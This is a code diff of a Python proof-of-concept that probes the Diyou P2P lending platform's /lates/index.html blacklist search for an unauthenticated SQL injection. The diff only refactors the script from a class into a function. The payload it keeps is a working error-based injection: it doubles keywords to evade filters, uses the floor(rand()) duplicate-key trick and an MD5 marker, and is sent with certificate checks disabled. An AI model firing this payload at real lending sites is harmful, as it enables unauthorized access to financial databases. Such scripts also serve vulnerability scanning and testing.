@@ -9,17 +9,10 @@ description: 帝友P2P借贷系统/lates/index.html逾期黑名单搜索处过�
 import sys
 import requests
 import warnings
-  
-  
-
-class latesindex_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['帝友P2P借贷系统无需登录SQL注入漏洞', '', '']
         payload = "/lates/index.html?username=123%27/**/and/**/(seleselectct/**/1/**/from/**/(selselectect/**/count(*),concat(0x7e,MD5(%271234%27),0x7e,floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)%23"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -34,5 +27,5 @@ class latesindex_sqli:
         return result
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = latesindex_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
